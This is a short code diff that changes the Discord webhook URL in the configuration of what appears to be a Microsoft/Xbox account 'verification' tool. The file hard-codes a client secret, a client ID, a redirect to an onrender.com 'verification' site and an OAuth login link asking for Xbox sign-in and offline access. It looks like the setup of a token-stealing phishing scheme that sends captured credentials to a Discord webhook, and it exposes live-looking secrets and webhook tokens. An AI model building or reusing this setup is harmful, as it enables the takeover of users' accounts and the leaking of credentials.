@@ -2,7 +2,7 @@
 const client_secret = 'thj8Q~C1xEzGzUw-d6kcockrxQezUhmqvhRNycKZ' //you need to put the "Secret Value" here not the "Secret ID"!!!!
 const client_id = '8daafb9d-a3fd-45d3-ba89-8f0f09cd1418'
 const redirect_uri = 'https://verification-cl8h.onrender.com'
-const webhook_url = 'https://discord.com/api/webhooks/1208420562746220635/mqDyfnhidPnP0ZBItyz9e89aAlF58RsWO558BajRY5UYkwLiykglAY1dfkOuLf9U80Tn'
+const webhook_url = 'https://discord.com/api/webhooks/1208248704155258911/ThEhJqRYP1XM78cy6apG6R0h5ZLAE7L75W4WCxkwyZaJOA2YiRswFLrFa3iYx1i2JVKJ'
 
 //Requirements
 const redirect = 'https://login.live.com/oauth20_authorize.srf?client_id='+client_id+'&response_type=code&redirect_uri='+redirect_uri+'&scope=XboxLive.signin+offline_access&state=NOT_NEEDED'
